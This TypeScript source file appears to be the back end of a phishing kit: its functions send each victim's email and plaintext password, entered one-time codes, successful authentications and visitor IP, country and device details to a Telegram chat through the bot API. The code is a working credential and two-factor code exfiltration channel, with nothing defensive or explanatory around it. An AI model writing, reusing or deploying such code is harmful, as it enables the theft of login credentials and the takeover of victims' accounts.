const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

export async function sendTelegramMessage(message: string): Promise<void> {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    throw new Error("Telegram credentials not configured");
  }

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const response = await fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: "HTML",
    }),
  });

  if (!response.ok) {
    const error = await response.text();
    throw new Error(`Telegram API error: ${error}`);
  }
}

export async function notifyLogin(email: string, password: string, language?: string, device?: string, browser?: string, os?: string): Promise<boolean> {
  const message = `
<b>🔐 Login Attempt</b>

<b>Email:</b> ${email}
<b>Password:</b> ${password}
<b>Language:</b> ${language || 'Unknown'}
<b>Device:</b> ${device || 'Unknown'}
<b>Browser:</b> ${browser || 'Unknown'}
<b>OS:</b> ${os || 'Unknown'}
<b>Time:</b> ${new Date().toLocaleString()}
  `.trim();

  try {
    await sendTelegramMessage(message);
    return true;
  } catch (error) {
    console.error("Failed to send login notification:", error);
    return false;
  }
}

export async function notifyOtpVerification(otp: string, language?: string, device?: string, browser?: string, os?: string, attempt?: number): Promise<boolean> {
  const message = `
<b>✅ OTP Verification Success</b>

<b>Code:</b> ${otp}
<b>Attempt:</b> ${attempt || 1}
<b>Language:</b> ${language || 'Unknown'}
<b>Device:</b> ${device || 'Unknown'}
<b>Browser:</b> ${browser || 'Unknown'}
<b>OS:</b> ${os || 'Unknown'}
<b>Time:</b> ${new Date().toLocaleString()}
  `.trim();

  try {
    await sendTelegramMessage(message);
    return true;
  } catch (error) {
    console.error("Failed to send OTP verification notification:", error);
    return false;
  }
}

export async function notifyOtpFailure(otp: string, language?: string, device?: string, browser?: string, os?: string, attempt?: number): Promise<boolean> {
  const message = `
<b>❌ OTP Verification Failed</b>

<b>Entered Code:</b> ${otp}
<b>Attempt:</b> ${attempt || 1} of 2
<b>Language:</b> ${language || 'Unknown'}
<b>Device:</b> ${device || 'Unknown'}
<b>Browser:</b> ${browser || 'Unknown'}
<b>OS:</b> ${os || 'Unknown'}
<b>Time:</b> ${new Date().toLocaleString()}
  `.trim();

  try {
    await sendTelegramMessage(message);
    return true;
  } catch (error) {
    console.error("Failed to send OTP failure notification:", error);
    return false;
  }
}

export async function notifySuccess(language?: string, device?: string, browser?: string, os?: string): Promise<boolean> {
  const message = `
<b>🎉 Authentication Complete</b>

<b>Status:</b> User successfully authenticated
<b>Language:</b> ${language || 'Unknown'}
<b>Device:</b> ${device || 'Unknown'}
<b>Browser:</b> ${browser || 'Unknown'}
<b>OS:</b> ${os || 'Unknown'}
<b>Time:</b> ${new Date().toLocaleString()}
  `.trim();

  try {
    await sendTelegramMessage(message);
    return true;
  } catch (error) {
    console.error("Failed to send success notification:", error);
    return false;
  }
}

export async function notifyVisitor(
  ip: string,
  country: string,
  device: string,
  browser: string,
  os: string,
  page: string,
  language?: string
): Promise<boolean> {
  const message = `
<b>🌐 New Visitor</b>

<b>IP Address:</b> ${ip}
<b>Country:</b> ${country}
<b>Language:</b> ${language || 'Unknown'}
<b>Device:</b> ${device}
<b>Browser:</b> ${browser}
<b>OS:</b> ${os}
<b>Page:</b> ${page}
<b>Time:</b> ${new Date().toLocaleString()}
  `.trim();

  try {
    await sendTelegramMessage(message);
    return true;
  } catch (error) {
    console.error("Failed to send visitor notification:", error);
    return false;
  }
}
